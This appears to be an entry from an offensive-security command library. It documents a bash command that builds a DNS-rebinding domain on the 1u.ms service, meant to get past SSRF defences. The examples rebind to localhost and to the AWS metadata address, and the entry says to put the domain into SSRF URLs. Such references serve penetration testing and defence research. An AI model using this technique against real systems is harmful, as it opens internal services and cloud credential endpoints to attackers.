---
type: command
executor: bash
data: echo "make-$_ATTACKER_IP-rebind-$_INTERNAL_IP-rr.1u.ms"
tags:
  - ssrf
  - dns-rebinding
platforms:
  - Linux
  - macOS
verified: true
validated: true
---

# construct-dns-rebinding-domain

## Command

```bash
echo "make-$_ATTACKER_IP-rebind-$_INTERNAL_IP-rr.1u.ms"
```

## Description

This command constructs a DNS rebinding domain string using the 1u.ms service format. It outputs a domain that initially resolves to the attacker's IP and then rebinds to an internal target IP, useful for SSRF bypasses. Run this in a terminal to generate the domain for use in payloads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_IP | Public IP of the attacker's server for initial resolution | Yes |
| $_INTERNAL_IP | Internal IP to rebind to (e.g., 169.254.169.254 for AWS metadata) | Yes |

## Examples

### Basic Usage

```bash
echo "make-203.0.113.1-rebind-127.0.0.1-rr.1u.ms"
```

### Advanced Usage

For cloud metadata:

```bash
echo "make-203.0.113.1-rebind-169.254.169.254-rr.1u.ms"
```

## Expected Output

make-203.0.113.1-rebind-169.254.169.254-rr.1u.ms

This string is the rebinding domain; substitute it into SSRF URLs like http://[domain]/metadata.

## Related

- [[procedures/DNS-Rebinding-for-SSRF-Bypass]]
- [[techniques/Exploitation of Remote Services|T1210]]
